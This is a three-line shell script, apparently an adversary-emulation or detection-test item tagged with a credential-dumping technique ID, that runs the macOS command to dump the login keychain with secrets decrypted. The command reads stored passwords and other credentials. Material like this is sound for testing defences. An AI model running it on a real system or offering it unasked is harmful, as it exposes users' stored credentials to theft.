#!/usr/bin/env sh
# ATTACK_CREDENTIAL_DUMP_T1555_MACOS_KEYCHAIN
sudo security dump-keychain -d login.keychain
